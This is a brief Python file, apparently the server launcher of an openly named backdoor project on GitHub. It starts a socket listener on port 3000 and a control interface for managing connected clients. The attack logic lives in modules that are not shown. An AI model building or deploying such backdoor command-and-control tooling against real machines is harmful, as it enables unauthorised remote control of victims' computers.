"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox
"""
from src import logger
from src.server.control import Control
from src.server.socket import Socket
from src.server.view import View


class Server:
    def __init__(self, port):
        logger.init()

        self.socket = Socket(port)
        self.control = Control(self.socket)

    def start(self):
        self.socket.listen_asych()

        View(self.control)


if __name__ == "__main__":
    Server(3000).start()
